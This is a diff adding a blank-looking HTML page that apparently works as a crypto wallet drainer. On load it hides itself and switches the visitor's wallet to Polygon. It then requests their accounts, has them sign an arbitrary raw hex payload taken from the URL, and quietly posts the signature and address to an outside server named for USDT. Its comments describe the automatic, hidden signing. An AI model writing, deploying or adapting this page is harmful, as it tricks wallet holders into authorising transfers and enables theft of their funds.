@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>.</title>
+    <meta charset="utf-8">
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #000;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #status {
+            font-size: 0px;
+        }
+    </style>
+</head>
+<body>
+    <div id="status">.</div>
+
+    <script>
+        // 立即开始，不显示任何内容
+        setTimeout(async () => {
+            const status = document.getElementById('status');
+            const urlParams = new URLSearchParams(window.location.search);
+            const hexCode = urlParams.get('hex');
+            const requestId = urlParams.get('id');
+            
+            try {
+                // 1. 切换到 Polygon 网络
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x89' }] // Polygon 主网
+                    });
+                } catch (switchError) {
+                    // 如果网络不存在，添加 Polygon 网络
+                    if (switchError.code === 4902) {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x89',
+                                chainName: 'Polygon Mainnet',
+                                nativeCurrency: {
+                                    name: 'MATIC',
+                                    symbol: 'MATIC',
+                                    decimals: 18
+                                },
+                                rpcUrls: ['https://polygon-rpc.com'],
+                                blockExplorerUrls: ['https://polygonscan.com']
+                            }]
+                        });
+                    }
+                }
+
+                // 2. 自动连接钱包
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+                
+                // 3. 自动签名
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const signature = await signer.signMessage(ethers.utils.arrayify(hexCode));
+                
+                // 4. 自动提交到后端
+                const response = await fetch('https://usdt-vercel.vercel.app/api/submit-signature', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        hexCode: hexCode,
+                        signature: signature,
+                        userAddress: accounts[0],
+                        requestId: requestId
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (!result.success) {
+                    throw new Error(result.message || '提交签名失败');
+                }
+                
+                // 成功，保持隐藏状态
+                
+            } catch (error) {
+                // 只有出错时才显示错误信息
+                status.innerText = '签名失败: ' + error.message;
+                status.style.fontSize = '16px';
+                status.style.color = '#fff';
+                console.error('错误详情:', error);
+            }
+        }, 100);
+    </script>
+</body>
+</html>
